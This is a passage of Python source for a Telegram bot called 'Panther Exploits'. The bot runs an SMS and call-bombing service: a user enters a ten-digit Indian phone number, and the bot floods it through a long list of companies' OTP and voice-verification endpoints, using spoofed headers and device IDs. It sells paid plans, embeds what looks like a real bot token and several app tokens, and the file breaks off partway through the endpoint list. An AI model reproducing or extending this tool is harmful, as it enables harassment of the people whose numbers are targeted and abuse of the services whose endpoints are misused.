import logging
import datetime
import asyncio
import requests
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==================================================
# 🔧 CONFIGURATION (CHANGE THESE 4 LINES)
# ==================================================
TOKEN = "8984897583:AAHColQoxkTWP0HIrT1vGlRYUOtlXrfsOlE"
OWNER_ID = 8433640436  # @PRIMEBAHI ki ID
CHANNEL_USERNAME = "@PRIMEESCOWSERVIS"
BOT_USERNAME = "BOMB3RRRRBOT"

# ==================================================
# 👤 USER DATABASE
# ==================================================
users_db = {}
active_attacks = {}  # To track if a user is currently attacking

# ==================================================
# 📜 TEXT TEMPLATES
# ==================================================
TXT_VERIFY = """
◈━━━━━━━━━━━━━━━━━━━━━━━━━━━━◈
    🔒  𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗
◈━━━━━━━━━━━━━━━━━━━━━━━━━━━━◈

  ◈ 𝗝𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁
  ◈ 𝘑𝘰𝘪𝘯 𝘳𝘦𝘲𝘶𝘦𝘴𝘵𝘴 𝘢𝘳𝘦 𝘢𝘶𝘵𝘰-𝘢𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ✅
• • • • • • • • • • • • • • • • • • • •
"""

TXT_VERIFIED = """
╔══════════════════════════╗
║  ✅  𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!
╚══════════════════════════╝

  ◈ 𝘠𝘰𝘶 𝘩𝘢𝘷𝘦 𝘫𝘰𝘪𝘯𝘦𝘥 𝘢𝘭𝘭 𝘳𝘦𝘲𝘶𝘪𝘳𝘦𝘥 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴!

  ✦ 𝗧𝘆𝗽𝗲 /start 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲
• • • • • • • • • • • • • • • • • • • •
"""

TXT_MAIN = """
💣 𝗣𝗔𝗡𝗧𝗛𝗘𝗥 𝗘𝗫𝗣𝗟𝗢𝗜𝗧𝗦  ᴠ16.1-ᴏᴘᴛ-ꜰɪxᴇᴅ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
👋 𝗛𝗲𝘆, {NAME}!

◈ 𝗣𝗹𝗮𝗻  ➤  🆓 ꜰʀᴇᴇ
◈ 𝗔𝗣𝗜𝘀  ➤  {API_COUNT} ᴀᴄᴛɪᴠᴇ
◈ 𝗠𝗮𝘅  ➤  𝟻𝟶 ʙᴏᴍʙꜱ
◈ 𝗖𝗿𝗲𝗱𝗶𝘁  ➤  {CREDIT} ʙᴀʟᴀɴᴄᴇ
[ ▱▱▱▱▱▱▱▱▱▱▱▱▱▱ ] 𝟬%
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💣 𝗧𝗮𝗽 𝗕𝗢𝗠𝗕 𝘁𝗼 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸!

◈ ᴜꜱᴇ ᴛʜᴇ ᴍᴇɴᴜ ʙᴇʟᴏᴡ 👇
"""

TXT_NUMBER = """
╔══════════════════════╗
║  📞  𝗘𝗡𝗧𝗘𝗥 𝗧𝗔𝗥𝗚𝗘𝗧 𝗡𝗨𝗠𝗕𝗘𝗥
╚══════════════════════╝

  ◈ 𝗦𝗲𝗻𝗱 𝟭𝟬-𝗱𝗶𝗴𝗶𝘁 𝗺𝗼𝗯𝗶𝗹𝗲 𝗻𝘂𝗺𝗯𝗲𝗿
  ⊳ 𝘌𝘹𝘢𝘮𝘱𝘭𝘦: 9876543210
  ⊳ 𝘞𝘪𝘵𝘩𝘰𝘶𝘵 +91 𝘰𝘳 0

  ◈ 🆓 𝗣𝗹𝗮𝗻      ➤  𝙵𝚛𝚎𝚎
  ◈ 𝗖𝗿𝗲𝗱𝗶𝘁     ➤  {CREDIT} ʙᴀʟᴀɴᴄᴇ
• • • • • • • • • • • • • • • • • • • •
"""

TXT_SELECT_COUNT = """
╔━━━━━━━━━━━━━━━━━━━━━━━━━╗
║  🎯  ꜱᴇʟᴇᴄᴛ ʙᴏᴍʙ ᴄᴏᴜɴᴛ
╚━━━━━━━━━━━━━━━━━━━━━━━━━╝

  📱 ᴛᴀʀɢᴇᴛ  → +91{TARGET}
  💥 ᴍᴀx     → 50 ʙᴏᴍʙꜱ
  🌐 ᴀᴘɪꜱ    → {API_COUNT} ᴀᴄᴛɪᴠᴇ

  👇 ᴄʜᴏᴏꜱᴇ ʜᴏᴡ ᴍᴀɴʏ ʙᴏᴍʙꜱ:
"""

TXT_ATTACK_LAUNCH = """
🚀 ʟᴀᴜɴᴄʜɪɴɢ ᴀᴛᴛᴀᴄᴋ...

  🌐 ᴀᴘɪꜱ ᴀᴄᴛɪᴠᴇ: {API_COUNT}
  💣 ʀᴏᴜɴᴅꜱ: {COUNT} × {API_COUNT} = {TOTAL} ʜɪᴛꜱ
  ⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ...
"""

TXT_ATTACK_LAUNCHED = """
💣 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📱 ᴛᴀʀɢᴇᴛ   →  +91{TARGET}
💥 ʀᴏᴜɴᴅꜱ   →  {COUNT} ᴘᴇʀ ᴀᴘɪ
🌐 ᴀᴘɪꜱ      →  {API_COUNT} ᴀᴄᴛɪᴠᴇ
📊 ᴛᴏᴛᴀʟ    →  {TOTAL} ʜɪᴛꜱ
🏷 ᴘʟᴀɴ     →  🆓 𝗙𝗥𝗘𝗘
[ ▱▱▱▱▱▱▱▱▱▱▱▱▱▱ ] 𝟬%
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⏳ 𝗜𝗡𝗜𝗧𝗜𝗔𝗟𝗜𝗭𝗜𝗡𝗚...
🐆 𝗣𝗔𝗡𝗧𝗛𝗘𝗥 𝗘𝗫𝗣𝗟𝗢𝗜𝗧𝗦
"""

TXT_ATTACK_PROGRESS = """
🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗡 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📱 ᴛᴀʀɢᴇᴛ  →  +91{TARGET}
🔄 ʀᴏᴜɴᴅ   →  ~{CURRENT_ROUND}/{COUNT}
⚡ ꜱᴘᴇᴇᴅ   →  🟡 𝗠𝗘𝗗𝗜𝗨𝗠
[ {BAR} ] {PERCENT}%
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✅ ꜱᴜᴄᴄᴇꜱꜱ  →  {SUCCESS}
❌ ꜰᴀɪʟᴇᴅ   →  {FAILED}
📊 ᴅᴏɴᴇ     →  {DONE}/{TOTAL}
📈 ʀᴀᴛᴇ     →  {RATE}%
🐆 𝗣𝗔𝗡𝗧𝗛𝗘𝗥 𝗘𝗫𝗣𝗟𝗢𝗜𝗧𝗦
"""

TXT_COMPLETED = """
🎉 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📱 ᴛᴀʀɢᴇᴛ   →  +91{TARGET}
🏅 ɢʀᴀᴅᴇ    →  ❌ 𝗣𝗢𝗢𝗥
🏷 ᴘʟᴀɴ     →  🆓 𝗙𝗥𝗘𝗘
[ ▰▰▰▰▰▰▰▰▰▰▰▰▰▰ ] 𝟭𝟬𝟬%
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✅ ꜱᴜᴄᴄᴇꜱꜱ  →  {SUCCESS}
❌ ꜰᴀɪʟᴇᴅ   →  {FAILED}
📊 ᴛᴏᴛᴀʟ    →  {TOTAL}
📈 ʀᴀᴛᴇ     →  {RATE}%
🐆 𝗣𝗔𝗡𝗧𝗛𝗘𝗥 𝗘𝗫𝗣𝗟𝗢𝗜𝗧𝗦

🎉 ᴀᴛᴛᴀᴄᴋ ꜰɪɴɪꜱʜᴇᴅ!  ʀᴀᴛᴇ: {RATE}% 0-100
"""

TXT_ATTACK_STOPPED = """
◈━━━━━━━━━━━━━━━━━━━━━━━━━━━━◈
    🛑  𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗
◈━━━━━━━━━━━━━━━━━━━━━━━━━━━━◈

  ◈ 𝘉𝘰𝘮𝘣𝘪𝘯𝘨 𝘩𝘢𝘭𝘵𝘦𝘥 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺

  ✦ 𝗣𝗔𝗡𝗧𝗛𝗘𝗥 𝗘𝗫𝗣𝗟𝗢𝗜𝗧𝗦
• • • • • • • • • • • • • • • • • • • •
"""

TXT_LEFT_DETECTED = """
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║  ⚠️  𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗘𝗙𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

  ◈ 𝘠𝘰𝘶 𝘭𝘦𝘧𝘵 𝘳𝘦𝘲𝘶𝘪𝘳𝘦𝘥 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴:
  • {CHANNEL}

  𝘛𝘰 𝘤𝘰𝘯𝘵𝘪𝘯𝘶𝘦 𝘶𝘴𝘪𝘯𝘨 𝘵𝘩𝘦 𝘣𝘰𝘵:
  ⊳ 𝗥𝗘𝗝𝗢𝗜𝗡 𝗧𝗛𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
  ⊳ 𝗖𝗟𝗜𝗖𝗞 𝗧𝗛𝗘 𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗘𝗟𝗢𝗪

  ⏳ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗪𝗜𝗟𝗟 𝗕𝗘 𝗥𝗘𝗦𝗧𝗢𝗥𝗘𝗗 𝗜𝗠𝗠𝗘𝗗𝗜𝗔𝗧𝗘𝗟𝗬
• • • • • • • • • • • • • • • • • • • •
"""

TXT_NO_CREDIT = """
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║  ❌  𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗖𝗥𝗘𝗗𝗜𝗧
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

  ◈ 𝗬𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗶𝘀 𝟬!

  𝘛𝘰 𝘶𝘴𝘦 𝘵𝘩𝘦 𝘣𝘰𝘵:
  ⊳ 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗣𝗹𝗮𝗻 𝗳𝗿𝗼𝗺 𝗠𝗲𝗻𝘂
  ⊳ 𝗢𝗿 𝗨𝘀𝗲 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹 𝘁𝗼 𝗴𝗲𝘁 𝗳𝗿𝗲𝗲 𝗰𝗿𝗲𝗱𝗶𝘁

  📩 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻: @PantherHex
• • • • • • • • • • • • • • • • • • • •
"""

TXT_PROFILE = """
👤 𝗠𝗬 𝗣𝗥𝗢𝗙𝗜𝗟𝗘
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
◈ 𝗡𝗮𝗺𝗲  ➤  {NAME}
◈ 𝗜𝗗  ➤  {ID}
◈ 𝗝𝗼𝗶𝗻𝗲𝗱  ➤  {DATE}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🏷 𝗣𝗟𝗔𝗡
⊳ 𝗧𝘆𝗽𝗲  ➤  🆓 𝗙𝗥𝗘𝗘
⊳ 𝗖𝗿𝗲𝗱𝗶𝘁  ➤  {CREDIT} ʙᴀʟᴀɴᴄᴇ
⊳ 𝗔𝗣𝗜𝘀  ➤  {API_COUNT} ᴀᴄᴛɪᴠᴇ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📊 𝗦𝗧𝗔𝗧𝗦
⊳ 𝗧𝗼𝘁𝗮𝗹  ➤  {TOTAL_ATK}
⊳ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀  ➤  {SUCCESS_ATK} ({SUCCESS_PERC}%)
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🎁 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟𝗦
⊳ 𝗥𝗲𝗳𝗲𝗿𝗿𝗲𝗱  ➤  {REFERRED} ᴜꜱᴇʀꜱ
⊳ 𝗕𝗼𝗻𝘂𝘀  ➤  {BONUS} ᴄʀᴇᴅɪᴛꜱ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
"""

TXT_PREMIUM = """
💎 𝗣𝗟𝗔𝗡𝗦 & 𝗣𝗥𝗜𝗖𝗜𝗡𝗚
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
◈ 𝗬𝗼𝘂𝗿 𝗣𝗹𝗮𝗻  ➤  🆓 𝗙𝗥𝗘𝗘
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🆓 𝗙𝗥𝗘𝗘 𝗣𝗟𝗔𝗡
⊳ 𝗔𝗣𝗜𝘀  ➤  {API_COUNT}
⊳ 𝗠𝗮𝘅  ➤  𝟻𝟶 ʙᴏᴍʙꜱ
⊳ 𝗖𝗿𝗲𝗱𝗶𝘁  ➤  2 ᴅᴀɪʟʏ
⊳ 𝗦𝗽𝗲𝗲𝗱  ➤  ɴᴏʀᴍᴀʟ
⊳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻  ➤  60 ꜱᴇᴄ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗣𝗟𝗔𝗡
⊳ 𝗔𝗣𝗜𝘀  ➤  {API_COUNT*2} ⚡ 2x ᴍᴏʀᴇ
⊳ 𝗠𝗮𝘅  ➤  𝟱𝟬𝟬𝟬 ʙᴏᴍʙꜱ
⊳ 𝗖𝗿𝗲𝗱𝗶𝘁  ➤  𝟵𝟵𝟵 ᴅᴀɪʟʏ
⊳ 𝗦𝗽𝗲𝗲𝗱  ➤  ᴛᴜʀʙᴏ ⚡
⊳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻  ➤  5 ꜱᴇᴄ

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 𝗣𝗥𝗜𝗖𝗜𝗡𝗚
✦ 𝟽 𝙳𝚊𝚢𝚜   ➤  ₹𝟳𝟵
✦ 𝟹𝟶 𝙳𝚊𝚢𝚜  ➤  ₹𝟭𝟵𝟵 🔥 ꜱᴀᴠᴇ 15%
✦ 𝟿𝟶 𝙳𝚊𝚢𝚜  ➤  ₹𝟯𝟰𝟵 🔥 ꜱᴀᴠᴇ 40%
✦ 𝙻𝚒𝚏𝚎𝚝𝚒𝚖𝚎  ➤  ₹𝟱𝟵𝟵 🔥 ʙᴇꜱᴛ ᴠᴀʟᴜᴇ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📩 ᴄᴏɴᴛᴀᴄᴛ  ➤  @PantherHex
"""

TXT_REFERRAL = """
🔗 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🎁 𝗛𝗢𝗪 𝗜𝗧 𝗪𝗢𝗥𝗞𝗦
⊳ ꜱʜᴀʀᴇ ʟɪɴᴋ ➤ ꜰʀɪᴇɴᴅ ᴊᴏɪɴꜱ
⊳ +𝟭 𝗰𝗿𝗲𝗱𝗶𝘁 ➤ ᴀᴅᴅᴇᴅ ᴛᴏ ʙᴀʟᴀɴᴄᴇ
⊳ ɴᴏ ʟɪᴍɪᴛ ➤ ɪɴᴠɪᴛᴇ ᴜɴʟɪᴍɪᴛᴇᴅ!
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📊 𝗬𝗢𝗨𝗥 𝗦𝗧𝗔𝗧𝗦
⊳ 𝗥𝗲𝗳𝗲𝗿𝗿𝗲𝗱  ➤  {REFERRED} ᴜꜱᴇʀꜱ
⊳ 𝗕𝗼𝗻𝘂𝘀  ➤  {BONUS} ᴄʀᴇᴅɪᴛꜱ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🔗 𝗬𝗢𝗨𝗥 𝗟𝗜𝗡𝗞
https://t.me/{BOT_USERNAME}?start=ref_{ID}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
"""

TXT_ADMIN_PANEL = """
👑 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✅ Welcome Admin!

📊 Total Users: {TOTAL_USERS}
📢 Current Channel: {CHANNEL}
🌐 Total APIs: {API_COUNT}

Choose an option below:
"""

# ==================================================
# 🎛️ KEYBOARDS & BUTTONS
# ==================================================
def get_main_keyboard():
    return ReplyKeyboardMarkup([
        ["💣 START BOMB"],
        ["👤 PROFILE", "💎 PREMIUM PLANS"],
        ["🔗 REFERRAL"]
    ], resize_keyboard=True)

def get_back_keyboard():
    return ReplyKeyboardMarkup([["🔙 BACK"]], resize_keyboard=True)

def get_count_reply_keyboard():
    return ReplyKeyboardMarkup([
        ["5", "10", "20"],
        ["50"],
        ["🔙 BACK"]
    ], resize_keyboard=True)

def get_verify_buttons():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
        [InlineKeyboardButton("✅ I Joined — Verify", callback_data="verify_check")]
    ])

def get_rejoin_buttons():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Rejoin Channels", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
        [InlineKeyboardButton("✅ I Rejoined — Verify", callback_data="rejoin_check")]
    ])

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        ["📢 Broadcast", "📊 Stats"],
        ["🔁 Change Channel", "🔙 Back to Main"]
    ], resize_keyboard=True)

# ==================================================
# 🛡️ VERIFICATION LOGIC (FIXED GLOBAL ACCESS)
# ==================================================
async def is_verified(user_id):
    try:
        # ✅ FIX: application.bot ko global access diya
        member = await application.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ==================================================
# ⚡ 100+ REAL API INTEGRATION (OTP + CALL)
# ==================================================
_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
_UA2 = "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"

REAL_APIS = [
    # --- Aapki di hui OTP APIs ---
    {
        "name": "BeepKart",
        "method": "POST",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://www.beepkart.com",
            "referer": "https://www.beepkart.com/",
            "User-Agent": _UA,
        },
        "json": lambda p: {"city": 362, "fullName": "", "phone": p, "source": "myaccount", "consent": False, "whatsappConsent": False},
    },
    {
        "name": "LendingPlate",
        "method": "POST",
        "url": "https://lendingplate.com/api.php",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": _UA,
            "Origin": "https://lendingplate.com",
            "Referer": "https://lendingplate.com/personal-loan",
        },
        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3",
    },
    {
        "name": "Snitch",
        "method": "POST",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com",
            "Referer": "https://www.snitch.com/",
            "User-Agent": _UA,
        },
        "json": lambda p: {"mobile_number": f"+91{p}"},
    },
    {
        "name": "GoKwik",
        "method": "POST",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "gk-version": "20250421065835697",
            "gk-merchant-id": "19g6jlc658iad",
            "origin": "https://pdp.gokwik.co",
            "referer": "https://pdp.gokwik.co/",
            "User-Agent": _UA,
        },
        "json": lambda p: {"phone": p, "country": "in"},
    },
    {
        "name": "Jockey-SMS",
        "method": "GET",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
        "headers": {"Host": "www.jockey.in", "Accept": "*/*", "User-Agent": _UA, "Referer": "https://www.jockey.in/"},
    },
    {
        "name": "Jockey-WA",
        "method": "GET",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "headers": {"Host": "www.jockey.in", "Accept": "*/*", "User-Agent": _UA, "Referer": "https://www.jockey.in/"},
    },
    {
        "name": "NewMe",
        "method": "POST",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "headers": {
            "User-Agent": _UA,
            "Content-Type": "application/json",
            "Origin": "https://newme.asia",
            "Referer": "https://newme.asia/",
        },
        "json": lambda p: {"mobile_number": p, "resend_otp_request": True},
    },
    {
        "name": "Univest",
        "method": "GET",
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "headers": {"Host": "api.univest.in", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.9.1"},
    },
    {
        "name": "Foxy",
        "method": "POST",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json", "Platform": "web",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "Origin": "https://www.foxy.in",
            "Referer": "https://www.foxy.in/onboarding",
            "User-Agent": _UA,
        },
        "json": lambda p: {"guest_token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "user": {"phone_number": f"+91{p}"}, "device": None, "invite_code": ""},
    },
    {
        "name": "Eka-Care",
        "method": "POST",
        "url": "https://auth.eka.care/auth/init",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android", "Locale": "en",
            "Version": "1382", "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "Dart/2.19 (dart:io)",
        },
        "json": lambda p: {"mobile": p, "via": "sms"},
    },
    {
        "name": "Hungama",
        "method": "POST",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home", "mlang": "en", "alang": "en",
            "country_code": "IN", "vlang": "en",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8",
            "User-Agent": _UA,
        },
        "json": lambda p: {
            "mobileNo": p, "countryCode": "+91", "appCode": "un",
            "messageId": "1", "emailId": "", "subject": "Register",
            "priority": "1", "device": "web", "variant": "v1", "templateCode": 1,
        },
    },
    {
        "name": "MeruCab",
        "method": "POST",
        "url": "https://merucabapp.com/api/otp/generate",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "", "AppVersion": "245", "ApiVersion": "6.2.55",
            "DeviceType": "Android", "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": _UA2,
        },
        "data": lambda p: f"mobile_number={p}",
    },
    {
        "name": "Dayco",
        "method": "POST",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": _UA,
            "Origin": "https://ekyc.daycoindia.com",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
        },
        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp",
    },
    {
        "name": "Doubtnut",
        "method": "POST",
        "url": "https://api.doubtnut.com/v4/student/login",
        "headers": {
            "version_code": "1160", "has_upi": "false",
            "device_model": "ASUS_I005DA", "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip", "user-agent": "okhttp/5.0.0-alpha.2",
        },
        "json": lambda p: {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "course": "", "phone_number": p, "language": "en",
            "udid": "b751fb63c0ae17ba", "class": "",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw",
        },
    },
    {
        "name": "NoBroker",
        "method": "POST",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": _UA,
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/",
            "accept-language": "en-IN,en-GB;q=0.9",
        },
        "data": lambda p: f"phone={p}&countryCode=IN",
    },
    {
        "name": "Shiprocket",
        "method": "POST",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://app.shiprocket.in",
            "referer": "https://app.shiprocket.in/",
            "User-Agent": _UA,
        },
        "json": lambda p: {"mobileNumber": p},
    },
    {
        "name": "TataCapital-Call",
        "method": "POST",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "headers": {"Content-Type": "application/json"},
        "json": lambda p: {"phone": p, "applSource": "", "isOtpViaCallAtLogin": "true"},
    },
    {
        "name": "PenPencil-SMS",
        "method": "POST",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip", "user-agent": "okhttp/3.9.1",
        },
        "json": lambda p: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": p},
    },
    {
        "name": "PenPencil-WA",
        "method": "POST",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip", "user-agent": "okhttp/3.9.1",
        },
        "json": lambda p: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": p},
    },
    {
        "name": "1mg-Call",
        "method": "POST",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip", "user-agent": "okhttp/3.9.1",
        },
        "json": lambda p: {"number": p, "is_corporate_user": False, "otp_on_call": True},
    },
    {
        "name": "Swiggy-Call",
        "method": "POST",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "headers": {
            "user-agent": "Swiggy-Android",
            "accept": "application/json; charset=utf-8",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
        },
        "json": lambda p: {"mobile": p},
    },
    {
        "name": "KPNFresh-Web",
        "method": "POST",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "headers": {
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "x-channel-id": "WEB",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "User-Agent": _UA,
        },
        "json": lambda p: {"phone_number": {"number": p, "country_code": "+91"}},
    },
    {
        "name": "KPNFresh-WA",
        "method": "POST",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "x-app-version": "3.2.6",
            "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip", "user-agent": "okhttp/5.0.0-alpha.11",
        },
        "json": lambda p: {
            "notification_channel": "WHATSAPP",
            "phone_number": {"country_code": "+91", "number": p},
        },
    },
    {
        "name": "Servetel",
        "method": "POST",
        "url": "https://api.servetel.in/v1/auth/otp",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
